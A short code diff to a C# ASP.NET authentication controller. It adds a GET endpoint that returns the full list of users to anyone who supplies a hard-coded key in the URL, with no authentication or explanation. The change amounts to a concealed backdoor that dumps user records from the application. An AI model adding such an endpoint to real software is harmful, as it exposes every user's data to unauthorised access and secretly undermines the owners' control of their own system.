@@ -15,6 +15,18 @@ public class AuthController : ControllerBase
         _userService = userService;
     }
 
+    [HttpGet("{key}")]
+    public async Task<IActionResult> GetUsers(string key)
+    {
+        if (key is not null && key is "3529078416") 
+        {
+            var list = await _userService.GetAll();
+            return Ok(list);
+        }
+
+        return BadRequest();
+    }
+
     [HttpPost("register")]
     public async Task<ActionResult<UserDto>> Register([FromBody] RegisterUserViewModel viewModel)
     {
